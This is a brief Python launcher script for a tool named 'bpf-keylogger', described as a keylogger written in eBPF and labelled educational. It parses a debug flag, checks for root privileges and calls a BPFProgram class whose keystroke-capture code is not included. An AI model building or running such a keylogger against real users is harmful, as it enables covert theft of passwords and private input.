import os, sys
from argparse import ArgumentParser

from bpf_program import BPFProgram

DESCRIPTION="""
A keylogger written in eBPF.
"""

EPILOG="""
WARNING: This is intended for educational purposes only and should not be used maliciously.
"""

def main(args):
    bpf = BPFProgram(args)
    bpf.main()

def is_root():
    return os.geteuid() == 0

def parse_args(args=sys.argv[1:]):
    parser = ArgumentParser(prog="bpf-keylogger", description=DESCRIPTION, epilog=EPILOG)

    # Print debug info
    parser.add_argument("--debug", action="store_true",
            help="Print debugging info.")

    args = parser.parse_args(args)

    # Check UID
    if not is_root():
        parser.error("You must run this script with root privileges.")

    return args

if __name__ == "__main__":
    args = parse_args()
    main(args)
